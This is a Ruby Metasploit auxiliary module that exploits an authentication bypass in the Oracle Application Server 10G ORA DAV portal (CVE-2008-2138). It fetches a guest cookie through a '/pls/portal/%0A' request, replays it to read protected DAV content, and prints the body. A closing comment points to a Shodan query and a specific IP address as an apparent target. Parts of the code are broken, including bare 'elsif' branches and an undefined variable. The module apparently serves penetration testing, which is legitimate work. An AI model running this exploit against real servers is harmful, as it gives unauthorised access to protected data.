##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	#include Msf::Exploit::Remote::Tcp

	def initialize
		super(
			'Name'        => 'Oracle Application Server 10G ORA DAV Basic Authentication Bypass Vulnerability',
			'Version'     => '$Revision:$',
			'Description' => %q{
				This module sends tests for the  Oracle Application Server 10G ORA DAV Basic Authentication Bypass Vulnerability
					},
			'References'  =>
			[
				[ 'URL', 'http://carnal0wnage.attackresearch.com' ],
				[ 'URL', 'http://www.juniper.net/security/auto/vulnerabilities/vuln29119.html' ],
				[ 'CVE', '2008-2138' ],

			],
			'Author'      => [ 'CG' ],
			'License'     => MSF_LICENSE
			)

				register_options([
				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request", 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
			], self.class)
	
	end

	def run
		
		begin
			print_status("Testing for dav_portal authentication required")

			davrequest = '/dav_portal/portal/'
			guestrequest = '/pls/portal/%0A'

			res = send_request_cgi({
				'uri'     => davrequest,
				'method'  => 'GET',                                                                
			}, 30)

			if (res.nil?)
				print_error("no response for #{rhost}:#{rport} #{davrequest}")
				return
			elsif ( res.code == 401)
				print_status("We received the 401..sending the bypass request")
				#print_status("#{res.headers}")
			elsif
				print_status("Received a #{res.code} for the request")
				return
			end


			res = send_request_cgi({
				'uri'     => guestrequest,
				'method'  => 'GET',                                                                
			}, 30)

			if (res.nil?)
				print_error("no response for #{rhost}:#{rport} #{guestrequest}")
				return
			elsif ( res.code == 200)
				print_status("we received the 200 for pls/portal/%0A trying to grab a cookie ")
				#print_status("#{res.headers}")
				#print_status("The Cookie we need: #{res.headers['Set-Cookie']}")
					cookie = res.headers['Set-Cookie']
			elsif
				print_status("Received a #{res.code} for the request")
				print_status("#{res.headers}")
				return
			end

			print_status("We received the cookie: #{cookie}")

			print_status("Making the request again with our cookie")

			res = send_request_cgi({
				'uri'     => davrequest,
				'method'  => 'GET', 
				'headers' =>
	                       {
				    	'Cookie' => "#{cookie}",
					'Connection' => "keep-alive",
				}	                                                                              
			}, 30)

			if (res.nil?)
				print_error("no response for #{rhost}:#{rport} #{davportal}")
				return
			elsif ( res.code == 200)
				print_status("we received the 200 printing response body")
				print_status("#{res.body}")
			elsif
				print_status("Received a #{res.code} for the request")
				print_status("#{res.headers}")
				return
			end

			#end
		end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH =>e
			puts e.message
	end
end

#shodan RAC_ONE_HTTP  4.79.155.4/cgi/login   http://www.scip.ch/?nasldb.35029
